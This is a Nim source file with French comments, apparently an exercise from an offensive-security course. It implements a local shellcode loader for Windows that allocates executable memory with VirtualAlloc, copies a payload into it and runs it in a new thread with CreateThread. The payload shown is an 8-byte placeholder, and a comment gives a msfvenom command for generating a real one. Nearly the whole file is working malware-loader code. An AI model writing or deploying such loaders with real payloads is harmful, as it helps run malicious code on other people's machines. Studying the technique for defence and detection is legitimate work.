import winim/lean
import strformat

# ==============================================
# EXERCICE 1 : CHARGEUR DE SHELLCODE LOCAL
# ==============================================

when defined(windows):
  echo "[*] Loader initialisé sur Windows"
else:
  {.error: "Ce programme nécessite Windows".}

# --- Shellcode factice pour test (8 bytes) ---
# Pour un vrai test, générer avec :
# msfvenom -p windows/x64/messagebox TEXT='Test!' TITLE='PoC' -f nim
var payload: array[8, byte] = [
  byte 0xFC, 0x48, 0x83, 0xE4, 
  0xF0, 0xE8, 0xC0, 0x00
]

echo fmt"[*] Taille payload : {payload.len} bytes"

# --- Fonction d'injection locale ---
proc injectLocal[I, T](shellcode: var array[I, T]): bool =
  echo "[*] Début injection locale"
  
  # 1. Allouer mémoire exécutable
  let executable_memory = VirtualAlloc(
    nil,
    cast[SIZE_T](len(shellcode)),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if executable_memory == nil:
    echo "[-] Erreur VirtualAlloc"
    return false
  
  echo fmt"[+] Mémoire allouée : 0x{cast[int](executable_memory):X}"
  
  # 2. Copier le shellcode
  copyMem(executable_memory, shellcode[0].addr, len(shellcode))
  echo "[+] Shellcode copié en mémoire"
  
  # 3. Créer un thread pour exécuter le shellcode
  let tHandle = CreateThread(
    nil,
    0,
    cast[LPTHREAD_START_ROUTINE](executable_memory),
    nil,
    0,
    nil
  )
  
  if tHandle == 0:
    echo "[-] Erreur CreateThread"
    return false
  
  defer: CloseHandle(tHandle)
  echo "[+] Thread créé"
  
  # 4. Attendre la fin d'exécution
  echo "[*] Attente fin exécution..."
  discard WaitForSingleObject(tHandle, INFINITE)
  
  echo "[+] Exécution terminée"
  return true

# --- Point d'entrée ---
proc main(): int =
  echo "=================================="
  echo "  LOADER v1 - INJECTION LOCALE"
  echo "=================================="
  
  let success = injectLocal(payload)
  
  if success:
    echo "[+] Injection réussie !"
    return 0
  else:
    echo "[-] Injection échouée"
    return 1

when isMainModule:
  quit(main())